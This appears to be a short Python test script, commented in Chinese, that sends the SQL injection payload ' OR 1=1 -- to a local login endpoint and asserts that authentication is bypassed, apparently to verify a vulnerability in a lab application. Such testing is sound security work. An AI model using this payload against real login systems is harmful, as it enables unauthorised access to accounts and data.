import requests

def test_sql_injection():
    """测试 SQL 注入是否成功"""
    url = "http://127.0.0.1:5000/login"
    
    # SQL 注入 payload
    payload = {"username": "' OR 1=1 --", "password": "xxx"}
    res = requests.post(url, json=payload)
    
    # 验证注入成功（返回 200 而不是 400）
    assert res.status_code == 200, f"预期 200，实际 {res.status_code}"
    assert "success" in res.json(), "注入未成功绕过认证"
    
    print("🎯 SQL 注入成功！")
    print(f"响应: {res.json()}")

if __name__ == "__main__":
    test_sql_injection()